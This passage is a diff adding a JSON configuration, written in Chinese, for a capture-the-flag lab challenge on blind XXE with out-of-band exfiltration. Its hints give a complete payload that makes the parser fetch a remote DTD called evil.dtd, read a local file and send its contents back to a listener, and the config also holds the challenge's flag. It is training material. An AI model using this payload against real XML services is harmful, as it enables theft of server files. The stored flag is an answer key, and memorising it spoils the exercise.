@@ -1,0 +1,24 @@
+{
+  "id": "xxe2",
+  "category": "xxe",
+  "title": "星际物流 · XXE 盲注（OOB 带外）",
+  "difficulty": "hard",
+  "url_path": "/xxe2",
+  "runtime": "php",
+  "entry": "index.php",
+  "flag": "flag{xxe2_936a1958}",
+  "knowledge": [
+    "无回显场景的 OOB 思路：让服务器把数据\"主动喊\"到监听平台",
+    "参数实体 % + 外部 DTD 两级构造（%remote → %file/%send）",
+    "libxml 的 URI 字符集限制（{} 等字符触发 Invalid URI）与 URL 安全镜像的取舍"
+  ],
+  "hints": [
+    "页面只报条数、不回显内容——读到了也看不见。外部实体本质是\"解析器去请求 URL\"：把要读的文件拼进回调 URL，让数据以请求的形式送到 OOB 监听平台（控制台 http://127.0.0.1:8307/）。",
+    "普通实体在内部子集玩不出花，要用参数实体 %：第一步 %remote 让靶机拉取你的外部 DTD（OOB 平台的 /evil.dtd 会动态生成第二级：读文件→拼回调）。",
+    "payload：<!DOCTYPE batch [<!ENTITY % remote SYSTEM \"http://127.0.0.1:8307/evil.dtd?cb=http://127.0.0.1:8307&f=file:///<hex镜像路径>\">%remote;]><batch><item>x</item></batch> ——先试原档案会\"导入成功但无回调\"（{} 过不了 URI 校验），改读十六进制镜像，OOB 日志里的 d= 一串 hex 解码即 flag。"
+  ],
+  "writeup": "writeup.md",
+  "prev": "xxe1",
+  "next": null,
+  "notes": "OOB 为本地模拟（oob_server.js，Node 零依赖，端口 8307，部署时与靶机同主机常驻运行），替代真实外网回调平台；flag 文件两个：deploy/flag_xxe2.txt（原文）与 deploy/flag_xxe2.hex.txt（URL 安全十六进制镜像）均无结尾换行，部署时复制到容器根目录并删除/屏蔽 deploy 目录。复制时务必保持无结尾换行（cp 原文件即可）。"
+}
